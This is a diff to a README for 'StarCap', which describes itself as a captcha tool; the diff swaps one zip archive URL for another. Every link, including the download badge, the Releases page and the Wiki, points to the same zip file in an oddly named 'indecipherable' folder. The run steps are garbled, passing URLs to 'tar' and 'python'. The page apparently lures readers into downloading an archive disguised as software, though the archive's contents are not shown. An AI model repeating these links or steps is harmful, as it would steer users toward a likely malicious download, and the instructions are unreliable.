@@ -1,6 +1,6 @@
 # 🌟 StarCap - Simple Captcha Tool for Web Safety
 
-[![Download StarCap](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip%https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip)](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip)
+[![Download StarCap](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip%https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip)](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ Before installing StarCap, your system should meet the following requirements:
 
 ## 🔗 Download & Install
 
-To download StarCap, visit this page: [StarCap Releases](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip).
+To download StarCap, visit this page: [StarCap Releases](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Choose the latest release, typically labeled as "Latest".
-3. Find the files available for download. You will see different formats, like `.exe` for Windows or `https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip` for Linux.
+3. Find the files available for download. You will see different formats, like `.exe` for Windows or `https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip` for Linux.
 4. Click on the link corresponding to your system to start the download.
 
 ## 🖥️ How to Run StarCap
@@ -39,7 +39,7 @@ Once you have downloaded StarCap, follow these steps to run it:
 2. Navigate to the directory where you downloaded the file using the `cd` command.
 3. Unzip the downloaded file by running:
    ```
-   tar -xzf https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip
+   tar -xzf https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip
    ```
 4. Navigate into the extracted folder:
    ```
@@ -47,7 +47,7 @@ Once you have downloaded StarCap, follow these steps to run it:
    ```
 5. Run the application with:
    ```
-   python https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip
+   python https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip
    ```
 
 Both users should see a window where they can set up and configure the captcha for their website.
@@ -68,7 +68,7 @@ StarCap allows you to customize various aspects of the captcha, such as:
 
 ## 📖 Documentation
 
-For detailed instructions and advanced features, refer to the [StarCap Wiki](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip).
+For detailed instructions and advanced features, refer to the [StarCap Wiki](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip).
 
 ## 🤝 Contributions
 
@@ -82,7 +82,7 @@ Remember to check back regularly for updates and new features.
 
 ## 🔗 Important Links
 
-- [StarCap Releases](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip)
-- [StarCap Wiki](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Star-Cap-v1.3.zip)
+- [StarCap Releases](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip)
+- [StarCap Wiki](https://raw.githubusercontent.com/EternityRPp/StarCap/main/indecipherable/Cap_Star_2.5-beta.3.zip)
 
 Thank you for choosing StarCap. Enjoy a safer, more secure experience on your website!
